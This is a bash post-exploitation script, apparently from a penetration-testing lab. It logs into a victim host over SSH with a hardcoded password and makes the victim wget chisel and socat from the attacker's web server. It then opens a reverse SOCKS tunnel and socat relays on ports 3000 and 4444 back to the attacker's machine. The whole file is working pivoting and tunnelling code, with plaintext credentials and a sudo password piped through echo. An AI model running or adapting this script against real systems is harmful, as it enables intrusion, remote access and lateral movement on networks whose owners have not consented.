#!/bin/bash
myip=$(ifconfig tun0 | grep "inet " | awk '{print $2}')
port=80

echo "Enter user password"
read password

echo "Uploading chisel and socat"
###upload
lastpwd=$(pwd)
cd ~/Pentest_Learning/linux_remote_tools; 
echo $password | sudo -S python3 -m http.server $port | server_pid=$(echo $!) &
sshpass -p 'bzuisJDnuI6WUDl' ssh j0hn@10.11.1.252 -p 22000 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa "wget http://$myip:$port/socat_32;wget http://$myip:$port/chisel_32"
wait
kill -9 $server_pid
cd $lastpwd
#sshpass -p 'bzuisJDnuI6WUDl' scp -P 22000 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa /home/p4cm4n/Pentest_Learning/linux_remote_tools/tools.zip j0hn@10.11.1.252:/home/j0hn/tools.zip
sshpass -p 'bzuisJDnuI6WUDl' ssh j0hn@10.11.1.252 -p 22000 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa "mkdir /home/j0hn/tools; mv ~/socat_32 ~/tools/socat;mv ~/chisel_32 ~/tools/chisel;chmod +x /home/j0hn/tools/chisel"
echo "Starting chisel server"
/home/p4cm4n/Pentest_Learning/linux_remote_tools/chisel server --port 6969 --reverse &
echo "Starging chisel client on victim server"
nohup sshpass -p 'bzuisJDnuI6WUDl' ssh j0hn@10.11.1.252 -p 22000 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa "/home/j0hn/tools/chisel client $myip:6969 R:socks &"
echo "Forwarding ports 4444 and $port with socat"
sshpass -p 'bzuisJDnuI6WUDl' ssh j0hn@10.11.1.252 -p 22000 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa "/home/j0hn/tools/socat tcp-l:3000,fork,reuseaddr tcp:$myip:3000 &"
sshpass -p 'bzuisJDnuI6WUDl' ssh j0hn@10.11.1.252 -p 22000 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa "/home/j0hn/tools/socat tcp-l:4444,fork,reuseaddr tcp:$myip:4444 &"